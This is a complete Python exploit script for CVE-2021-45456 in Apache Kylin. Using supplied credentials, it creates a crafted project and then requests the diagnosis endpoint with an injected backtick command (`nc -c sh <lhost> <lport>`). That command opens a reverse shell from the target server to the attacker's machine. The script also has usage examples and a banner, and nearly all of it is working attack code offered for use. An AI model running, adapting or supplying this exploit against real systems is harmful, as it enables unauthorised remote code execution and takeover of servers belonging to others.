import sys
import requests
import base64
import json
import urllib.request
import base64
from colorama import Style, Fore


def create_project(host, lhost, lport, username, password):
    # Create a project with the project name as payload
    if "." in lhost:
        lhost = lhost.replace(".", "")

    url = f"http://{host}/kylin/api/projects"
    auth_header = f"Basic {base64.b64encode(f'{username}:{password}'.encode('ascii')).decode('ascii')}"
    headers = {
        "Host": host,
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Authorization": auth_header,
        "Content-Type": "application/json;charset=utf-8",
        "Origin": f"http://{host}",
        "Connection": "close",
        "Referer": f"http://{host}/kylin/models"
    }
    project_data = {
        "name": f"nccsh{lhost}{lport}", # the name of the project i.e. the malicious payload
        "description": "",
        "override_kylin_properties": {}
    }

    project_desc_data = json.dumps(project_data).replace('"', '\\"')
    payload = f"{{\"projectDescData\": \"{project_desc_data}\"}}"
    proxies = {
        "http": "http://127.0.0.1:8082",
        "https": "http://127.0.0.1:8082"
    }

    # Send the request through proxy
    #response = requests.post(url, headers=headers, data=payload, proxies=proxies)
    
    response = requests.post(url, headers=headers, data=payload)
    error_message = "The project named '{}' already exists.".format(project_data["name"])
    if response.status_code == 200:
        jsessionid = response.cookies.get("JSESSIONID")
        #return jsessionid, project_data["name"]
        return jsessionid
    
    elif error_message in response.text:
        print(error_message)
        print("[!] Try another port")
        return False

    else:
        print(f"[-] Error: {response.status_code} {response.reason}")
        return None, None


def trigger_diagnosis(host, jsessionid, lhost, lport):
    # This function will trigger the exploitation
    oglhost = lhost
    if "." in lhost:
        lhost = lhost.replace(".", "")

    project_name = f"nccsh{lhost}{lport}" # the name of the project i.e. the malicious payload

    url = f"http://{host}/kylin/api/diag/project/%60nc%20%2dc%20sh%20{oglhost.replace('.', '%2e')}%20{lport}%60/download"
    #print(url)
    headers = {
        "Host": host,
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Referer": f"http://{host}/kylin/admin",
        "Cookie": f"project=%22{project_name}%22; JSESSIONID={jsessionid}",
        "Upgrade-Insecure-Requests": "1"
    }
    
    #print(headers)

    # Send the request through proxy
    #proxy_handler = urllib.request.ProxyHandler({"http": "http://127.0.0.1:8082", "https": "http://127.0.0.1:8082"})
    #opener = urllib.request.build_opener(proxy_handler)
    #urllib.request.install_opener(opener)

    req = urllib.request.Request(url, headers=headers)
    response = urllib.request.urlopen(req)

    if response.getcode() == 200:
        print("[+] Request is successful.")
    else:
        print(f"[-] Error: {response.getcode()} {response.reason}") 

if len(sys.argv) != 5:
    banner="""
                                            
                                        
                .;;;;;,.                
             ...cdddddo;...             
            ,loodddddddoooc'            
         .,;cdddddddddddddoc;'.         
         ,odlccloddddddlcccodc.         
      .;:cdo,. .:dddddo,. .cdoc:,.      
      ;ddddo;...:dddddo;...cddddl.      
      ;dddddollodddddddoooooddddl.      
      .',,,;lddoc,,,,,;lddoc,'''.       
           .;ddo,     .:ddl'            
         .;;;,,,;:;;;;:;,,,;;,.         
     ....;cc,...;cccccc,..';c:'...      
     ;ooo;..;ool,.    .:ool,..:ooc.     
     ,ccc'  'cc:.      ,lc:. .,cc;.     
                                        
                                        
                                        

 #     # #     # #######  #####  #     # ######  ####### ######  
 ##   ## #     #      #  #     #  #   #  #     # #       #     # 
 # # # # #     #     #   #         # #   #     # #       #     # 
 #  #  # #######    #    #          #    ######  #####   ######  
 #     # #     #   #     #          #    #     # #       #   #   
 #     # #     #  #      #     #    #    #     # #       #    #  
 #     # #     # #######  #####     #    ######  ####### #     # 

               [!] CVE-2021-45456 Exploit
    """
    print(Fore.GREEN + banner)
    print(Style.RESET_ALL)
    print(f"Usage: python3 {sys.argv[0]} <host_ip:port> <lhost> <lport> <username:password>")
    print(f"Example: python3 {sys.argv[0]} 172.17.0.2:7070 172.17.0.1 2323 admin:KYLIN")
    sys.exit(1)

host = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]
username, password = sys.argv[4].split(":")


banner="""
                                            
                                        
                .;;;;;,.                
             ...cdddddo;...             
            ,loodddddddoooc'            
         .,;cdddddddddddddoc;'.         
         ,odlccloddddddlcccodc.         
      .;:cdo,. .:dddddo,. .cdoc:,.      
      ;ddddo;...:dddddo;...cddddl.      
      ;dddddollodddddddoooooddddl.      
      .',,,;lddoc,,,,,;lddoc,'''.       
           .;ddo,     .:ddl'            
         .;;;,,,;:;;;;:;,,,;;,.         
     ....;cc,...;cccccc,..';c:'...      
     ;ooo;..;ool,.    .:ool,..:ooc.     
     ,ccc'  'cc:.      ,lc:. .,cc;.     
                                        
                                        
                                        

 #     # #     # #######  #####  #     # ######  ####### ######  
 ##   ## #     #      #  #     #  #   #  #     # #       #     # 
 # # # # #     #     #   #         # #   #     # #       #     # 
 #  #  # #######    #    #          #    ######  #####   ######  
 #     # #     #   #     #          #    #     # #       #   #   
 #     # #     #  #      #     #    #    #     # #       #    #  
 #     # #     # #######  #####     #    ######  ####### #     # 

               [!] CVE-2021-45456 Exploit
    """
print(Fore.GREEN + banner)
print(Style.RESET_ALL)

jsessionid = create_project(host, lhost, lport, username, password)

if jsessionid != None and jsessionid != False:
    trigger_diagnosis(host, jsessionid, lhost, lport)

else:
    quit()